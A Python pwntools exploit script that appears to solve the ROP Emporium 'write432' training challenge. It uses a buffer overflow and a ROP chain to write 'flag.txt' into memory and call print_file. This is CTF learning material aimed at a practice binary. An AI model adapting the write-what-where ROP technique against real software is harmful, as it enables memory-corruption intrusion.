#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'write432')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./write432_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * cyclic_find(0x6161616c)

# ROPgadget --binary write432
# 0x08048543 : mov dword ptr [edi], ebp ; ret
# 0x080485aa : pop edi ; pop ebp ; ret
MOV_MEM = p32(0x8048543)
POP_EDI_EBP = p32(0x80485aa)

# (r2) iS - to print sections adresses
# 0x00001018    0x8 0x0804a018    0x8 -rw- 0x3   PROGBITS    .data
DATA_ADDR = 0x804a018

# "flag.txt" string
FLAG_STR = p32(int.from_bytes(b"flag", 'little'))
TXT_STR = p32(int.from_bytes(b".txt", 'little'))

# (r2) aaa; afl
# 0x080483d0    1      6 sym.imp.print_file
PR_FILE = p32(0x80483d0)

payload = padding
payload += POP_EDI_EBP + p32(DATA_ADDR) + FLAG_STR + MOV_MEM
payload += POP_EDI_EBP + p32(DATA_ADDR+4) + TXT_STR + MOV_MEM
payload += PR_FILE + p32(0xa5a5a5a5) + p32(DATA_ADDR)

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
